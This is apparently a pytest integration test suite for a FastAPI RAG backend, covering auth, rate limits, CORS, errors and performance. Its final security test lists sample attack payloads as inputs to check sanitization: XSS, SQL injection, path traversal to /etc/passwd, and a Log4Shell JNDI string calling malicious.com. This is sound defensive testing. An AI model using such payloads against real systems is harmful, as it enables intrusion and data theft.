# -*- coding: utf-8 -*-
"""
Recoloca.AI Integration Tests
Comprehensive integration test suite for the FastAPI backend

Author: @AgenteM_DevFastAPI
Date: 2025-06-20
Version: 1.0.0
"""

import pytest
import asyncio
import time
import json
from typing import Dict, Any, List
from unittest.mock import AsyncMock, patch

from fastapi import status
from httpx import AsyncClient

from app.services.rag_service import RAGService, RAGQueryRequest, RAGQueryResponse, RAGDocument


class TestRAGIntegration:
    """Integration tests for RAG functionality."""
    
    @pytest.mark.asyncio
    async def test_full_rag_workflow(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test complete RAG workflow from API to service."""
        # 1. Check system health
        health_response = await async_client.get(
            "/health",
            headers=auth_headers
        )
        assert health_response.status_code == status.HTTP_200_OK
        health_data = health_response.json()
        assert "rag_service" in health_data
        
        # 2. Check RAG service status
        rag_status_response = await async_client.get(
            "/api/v1/rag/status",
            headers=auth_headers
        )
        assert rag_status_response.status_code == status.HTTP_200_OK
        rag_status = rag_status_response.json()
        assert "status" in rag_status
        
        # 3. Query documents
        query_data = {
            "query": "FastAPI integration test",
            "top_k": 5,
            "min_score": 0.3,
            "use_cache": True
        }
        
        query_response = await async_client.post(
            "/api/v1/rag/query",
            json=query_data,
            headers=auth_headers
        )
        assert query_response.status_code == status.HTTP_200_OK
        query_result = query_response.json()
        
        # Validate query response structure
        assert "results" in query_result
        assert "total_results" in query_result
        assert "query_time_ms" in query_result
        assert "cache_hit" in query_result
        
        # 4. Test cache functionality (second identical query)
        cache_query_response = await async_client.post(
            "/api/v1/rag/query",
            json=query_data,
            headers=auth_headers
        )
        assert cache_query_response.status_code == status.HTTP_200_OK
        cache_result = cache_query_response.json()
        
        # Second query should potentially be faster (cache hit)
        # Note: In our mock setup, cache_hit might still be False
        assert cache_result["query_time_ms"] >= 0
    
    @pytest.mark.asyncio
    async def test_rag_error_handling_integration(self, async_client: AsyncClient, auth_headers: Dict[str, str], test_app):
        """Test RAG error handling across the full stack."""
        # Mock RAG service to throw an error
        original_query = test_app.state.rag_service.query_documents
        test_app.state.rag_service.query_documents = AsyncMock(side_effect=Exception("Integration test error"))
        
        try:
            query_data = {
                "query": "error test query",
                "top_k": 3,
                "min_score": 0.5,
                "use_cache": False
            }
            
            response = await async_client.post(
                "/api/v1/rag/query",
                json=query_data,
                headers=auth_headers
            )
            
            # Should return 500 Internal Server Error
            assert response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
            error_data = response.json()
            assert "detail" in error_data
            assert "Internal server error" in error_data["detail"]
            
        finally:
            # Restore original method
            test_app.state.rag_service.query_documents = original_query
    
    @pytest.mark.asyncio
    async def test_rag_authentication_integration(self, async_client: AsyncClient):
        """Test RAG authentication across all endpoints."""
        endpoints_to_test = [
            ("/api/v1/rag/query", "POST", {"query": "test", "top_k": 3}),
            ("/api/v1/rag/status", "GET", None),
            ("/api/v1/rag/documents/test-doc", "GET", None),
            ("/api/v1/rag/categories", "GET", None),
        ]
        
        for endpoint, method, data in endpoints_to_test:
            if method == "POST":
                response = await async_client.post(endpoint, json=data)
            else:
                response = await async_client.get(endpoint)
            
            # All should return 403 Forbidden without authentication
            assert response.status_code == status.HTTP_403_FORBIDDEN
    
    @pytest.mark.asyncio
    async def test_rag_rate_limiting_integration(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test RAG rate limiting integration."""
        # Test query endpoint rate limiting (30 requests/minute)
        query_data = {
            "query": "rate limit test",
            "top_k": 1,
            "min_score": 0.5,
            "use_cache": False
        }
        
        # Send multiple requests quickly
        responses = []
        for i in range(5):  # Send 5 requests quickly
            response = await async_client.post(
                "/api/v1/rag/query",
                json=query_data,
                headers=auth_headers
            )
            responses.append(response)
            
            # Small delay to avoid overwhelming the system
            await asyncio.sleep(0.1)
        
        # Most requests should succeed (rate limit is generous for testing)
        success_count = sum(1 for r in responses if r.status_code == status.HTTP_200_OK)
        assert success_count >= 3  # At least some should succeed
        
        # If any are rate limited, they should return 429
        rate_limited = [r for r in responses if r.status_code == status.HTTP_429_TOO_MANY_REQUESTS]
        for response in rate_limited:
            error_data = response.json()
            assert "rate limit" in error_data["detail"].lower()


class TestApplicationLifecycle:
    """Integration tests for application lifecycle."""
    
    @pytest.mark.asyncio
    async def test_startup_sequence(self, test_app):
        """Test application startup sequence."""
        # RAG service should be initialized during startup
        assert hasattr(test_app.state, 'rag_service')
        assert isinstance(test_app.state.rag_service, RAGService)
        
        # Service should be marked as initialized
        # Note: In test environment, actual initialization might fail due to missing dependencies
        # but the service object should exist
        assert test_app.state.rag_service is not None
    
    @pytest.mark.asyncio
    async def test_health_endpoints_integration(self, async_client: AsyncClient):
        """Test health check endpoints integration."""
        # Test root health endpoint
        root_response = await async_client.get("/")
        assert root_response.status_code == status.HTTP_200_OK
        root_data = root_response.json()
        
        assert "status" in root_data
        assert "timestamp" in root_data
        assert "version" in root_data
        assert "rag_service" in root_data
        
        # Test dedicated health endpoint
        health_response = await async_client.get("/health")
        assert health_response.status_code == status.HTTP_200_OK
        health_data = health_response.json()
        
        # Should have same structure as root endpoint
        assert health_data["status"] == root_data["status"]
        assert "rag_service" in health_data


class TestCORSIntegration:
    """Integration tests for CORS functionality."""
    
    @pytest.mark.asyncio
    async def test_cors_preflight(self, async_client: AsyncClient):
        """Test CORS preflight requests."""
        # Test OPTIONS request for CORS preflight
        response = await async_client.options(
            "/api/v1/rag/query",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type,Authorization"
            }
        )
        
        # Should allow the request
        assert response.status_code in [status.HTTP_200_OK, status.HTTP_204_NO_CONTENT]
        
        # Check CORS headers
        headers = response.headers
        assert "access-control-allow-origin" in headers or "Access-Control-Allow-Origin" in headers
    
    @pytest.mark.asyncio
    async def test_cors_actual_request(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test actual CORS request."""
        # Add Origin header to simulate cross-origin request
        cors_headers = {
            **auth_headers,
            "Origin": "http://localhost:3000"
        }
        
        query_data = {
            "query": "CORS test query",
            "top_k": 3,
            "min_score": 0.3,
            "use_cache": True
        }
        
        response = await async_client.post(
            "/api/v1/rag/query",
            json=query_data,
            headers=cors_headers
        )
        
        assert response.status_code == status.HTTP_200_OK
        
        # Check CORS headers in response
        headers = response.headers
        # CORS headers might be case-insensitive
        cors_origin_header = None
        for header_name, header_value in headers.items():
            if header_name.lower() == "access-control-allow-origin":
                cors_origin_header = header_value
                break
        
        # Should have CORS headers (might be * or specific origin)
        assert cors_origin_header is not None


class TestMiddlewareIntegration:
    """Integration tests for middleware functionality."""
    
    @pytest.mark.asyncio
    async def test_trusted_host_middleware(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test trusted host middleware."""
        # Test with valid host
        response = await async_client.get(
            "/health",
            headers={
                **auth_headers,
                "Host": "localhost"
            }
        )
        assert response.status_code == status.HTTP_200_OK
        
        # Test with potentially untrusted host
        # Note: In test environment, this might not be enforced
        untrusted_response = await async_client.get(
            "/health",
            headers={
                **auth_headers,
                "Host": "malicious-host.com"
            }
        )
        # Should either succeed (if middleware is permissive in test) or return 400
        assert untrusted_response.status_code in [status.HTTP_200_OK, status.HTTP_400_BAD_REQUEST]
    
    @pytest.mark.asyncio
    async def test_request_response_cycle(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test complete request-response cycle through all middleware."""
        start_time = time.time()
        
        response = await async_client.post(
            "/api/v1/rag/query",
            json={
                "query": "middleware test query",
                "top_k": 3,
                "min_score": 0.3,
                "use_cache": True
            },
            headers=auth_headers
        )
        
        end_time = time.time()
        request_time = end_time - start_time
        
        assert response.status_code == status.HTTP_200_OK
        
        # Request should complete in reasonable time (including middleware overhead)
        assert request_time < 5.0
        
        # Response should have proper headers
        assert "content-type" in response.headers
        assert response.headers["content-type"] == "application/json"


class TestErrorHandlingIntegration:
    """Integration tests for error handling across the application."""
    
    @pytest.mark.asyncio
    async def test_validation_error_handling(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test validation error handling integration."""
        # Send invalid request data
        invalid_data = {
            "query": "",  # Empty query
            "top_k": -1,  # Invalid top_k
            "min_score": 2.0,  # Invalid score (> 1.0)
            "use_cache": "invalid"  # Invalid boolean
        }
        
        response = await async_client.post(
            "/api/v1/rag/query",
            json=invalid_data,
            headers=auth_headers
        )
        
        assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
        error_data = response.json()
        
        # Should have validation error details
        assert "detail" in error_data
        assert isinstance(error_data["detail"], list)
        
        # Should contain information about validation errors
        error_messages = [error["msg"] for error in error_data["detail"] if "msg" in error]
        assert len(error_messages) > 0
    
    @pytest.mark.asyncio
    async def test_not_found_error_handling(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test 404 error handling integration."""
        # Test non-existent endpoint
        response = await async_client.get(
            "/api/v1/rag/nonexistent",
            headers=auth_headers
        )
        
        assert response.status_code == status.HTTP_404_NOT_FOUND
        error_data = response.json()
        assert "detail" in error_data
    
    @pytest.mark.asyncio
    async def test_method_not_allowed_error_handling(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test 405 error handling integration."""
        # Test wrong HTTP method
        response = await async_client.put(
            "/api/v1/rag/query",  # This endpoint only accepts POST
            json={"query": "test"},
            headers=auth_headers
        )
        
        assert response.status_code == status.HTTP_405_METHOD_NOT_ALLOWED
        error_data = response.json()
        assert "detail" in error_data


class TestPerformanceIntegration:
    """Integration tests for performance across the application."""
    
    @pytest.mark.asyncio
    async def test_concurrent_requests_performance(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test performance under concurrent load."""
        # Create multiple different queries to avoid cache hits
        queries = [
            {"query": f"performance test query {i}", "top_k": 3, "min_score": 0.3, "use_cache": False}
            for i in range(10)
        ]
        
        start_time = time.time()
        
        # Send concurrent requests
        tasks = [
            async_client.post("/api/v1/rag/query", json=query, headers=auth_headers)
            for query in queries
        ]
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        end_time = time.time()
        
        total_time = end_time - start_time
        
        # All requests should complete within reasonable time
        assert total_time < 10.0  # 10 seconds for 10 concurrent requests
        
        # Count successful responses
        successful_responses = [
            r for r in responses 
            if not isinstance(r, Exception) and r.status_code == status.HTTP_200_OK
        ]
        
        # Most requests should succeed
        assert len(successful_responses) >= 8  # At least 80% success rate
    
    @pytest.mark.asyncio
    async def test_memory_usage_stability(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test memory usage stability under load."""
        # Send multiple requests to check for memory leaks
        query_data = {
            "query": "memory stability test",
            "top_k": 5,
            "min_score": 0.2,
            "use_cache": False
        }
        
        # Send 20 requests sequentially
        for i in range(20):
            response = await async_client.post(
                "/api/v1/rag/query",
                json=query_data,
                headers=auth_headers
            )
            
            # Each request should succeed
            assert response.status_code == status.HTTP_200_OK
            
            # Small delay to allow garbage collection
            await asyncio.sleep(0.05)
        
        # Final health check to ensure system is still stable
        health_response = await async_client.get("/health")
        assert health_response.status_code == status.HTTP_200_OK
    
    @pytest.mark.asyncio
    async def test_response_time_consistency(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test response time consistency."""
        query_data = {
            "query": "response time consistency test",
            "top_k": 3,
            "min_score": 0.3,
            "use_cache": False
        }
        
        response_times = []
        
        # Measure response times for multiple requests
        for i in range(5):
            start_time = time.time()
            
            response = await async_client.post(
                "/api/v1/rag/query",
                json=query_data,
                headers=auth_headers
            )
            
            end_time = time.time()
            response_time = end_time - start_time
            
            assert response.status_code == status.HTTP_200_OK
            response_times.append(response_time)
            
            # Small delay between requests
            await asyncio.sleep(0.1)
        
        # Calculate statistics
        avg_time = sum(response_times) / len(response_times)
        max_time = max(response_times)
        min_time = min(response_times)
        
        # Response times should be reasonable and consistent
        assert avg_time < 2.0  # Average under 2 seconds
        assert max_time < 5.0  # No request over 5 seconds
        assert max_time / min_time < 10  # No more than 10x variation


class TestDataFlowIntegration:
    """Integration tests for data flow through the application."""
    
    @pytest.mark.asyncio
    async def test_request_data_transformation(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test data transformation through the request pipeline."""
        # Send request with specific data
        request_data = {
            "query": "data transformation test",
            "top_k": 7,
            "min_score": 0.25,
            "category_filter": "test_category",
            "use_cache": True
        }
        
        response = await async_client.post(
            "/api/v1/rag/query",
            json=request_data,
            headers=auth_headers
        )
        
        assert response.status_code == status.HTTP_200_OK
        response_data = response.json()
        
        # Verify data structure and types
        assert isinstance(response_data["results"], list)
        assert isinstance(response_data["total_results"], int)
        assert isinstance(response_data["query_time_ms"], (int, float))
        assert isinstance(response_data["cache_hit"], bool)
        assert isinstance(response_data["query_hash"], str)
        
        # Verify data constraints
        assert response_data["total_results"] >= 0
        assert response_data["query_time_ms"] >= 0
        assert len(response_data["query_hash"]) > 0
        
        # Verify result structure if any results
        if response_data["results"]:
            result = response_data["results"][0]
            assert "content" in result
            assert "metadata" in result
            assert "score" in result
            assert "source_path" in result
            
            assert isinstance(result["content"], str)
            assert isinstance(result["metadata"], dict)
            assert isinstance(result["score"], (int, float))
            assert isinstance(result["source_path"], str)
    
    @pytest.mark.asyncio
    async def test_error_data_propagation(self, async_client: AsyncClient, auth_headers: Dict[str, str], test_app):
        """Test error data propagation through the application."""
        # Mock service to return specific error
        original_method = test_app.state.rag_service.query_documents
        test_app.state.rag_service.query_documents = AsyncMock(
            side_effect=ValueError("Specific test error message")
        )
        
        try:
            response = await async_client.post(
                "/api/v1/rag/query",
                json={"query": "error test", "top_k": 3, "min_score": 0.3},
                headers=auth_headers
            )
            
            assert response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
            error_data = response.json()
            
            # Error should be properly formatted
            assert "detail" in error_data
            assert isinstance(error_data["detail"], str)
            
            # Should contain generic error message (not expose internal details)
            assert "Internal server error" in error_data["detail"]
            
        finally:
            # Restore original method
            test_app.state.rag_service.query_documents = original_method


class TestSecurityIntegration:
    """Integration tests for security features."""
    
    @pytest.mark.asyncio
    async def test_jwt_token_validation_integration(self, async_client: AsyncClient):
        """Test JWT token validation across endpoints."""
        # Test with invalid token
        invalid_headers = {"Authorization": "Bearer invalid_token"}
        
        response = await async_client.post(
            "/api/v1/rag/query",
            json={"query": "test", "top_k": 3},
            headers=invalid_headers
        )
        
        assert response.status_code == status.HTTP_403_FORBIDDEN
        error_data = response.json()
        assert "detail" in error_data
    
    @pytest.mark.asyncio
    async def test_admin_endpoint_security(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test admin endpoint security."""
        # Test admin endpoint with regular user token
        response = await async_client.post(
            "/api/v1/rag/reindex",
            headers=auth_headers  # Regular user, not admin
        )
        
        assert response.status_code == status.HTTP_403_FORBIDDEN
        error_data = response.json()
        assert "detail" in error_data
        assert "admin" in error_data["detail"].lower() or "permission" in error_data["detail"].lower()
    
    @pytest.mark.asyncio
    async def test_input_sanitization_integration(self, async_client: AsyncClient, auth_headers: Dict[str, str]):
        """Test input sanitization across the application."""
        # Test with potentially malicious input
        malicious_queries = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://malicious.com/a}"
        ]
        
        for malicious_query in malicious_queries:
            response = await async_client.post(
                "/api/v1/rag/query",
                json={
                    "query": malicious_query,
                    "top_k": 3,
                    "min_score": 0.3,
                    "use_cache": False
                },
                headers=auth_headers
            )
            
            # Should either process safely or reject with validation error
            assert response.status_code in [
                status.HTTP_200_OK,
                status.HTTP_400_BAD_REQUEST,
                status.HTTP_422_UNPROCESSABLE_ENTITY
            ]
            
            if response.status_code == status.HTTP_200_OK:
                # If processed, should not contain the malicious content in response
                response_data = response.json()
                response_text = json.dumps(response_data).lower()
                
                # Should not contain obvious malicious patterns
                assert "<script>" not in response_text
                assert "drop table" not in response_text
                assert "../../../" not in response_text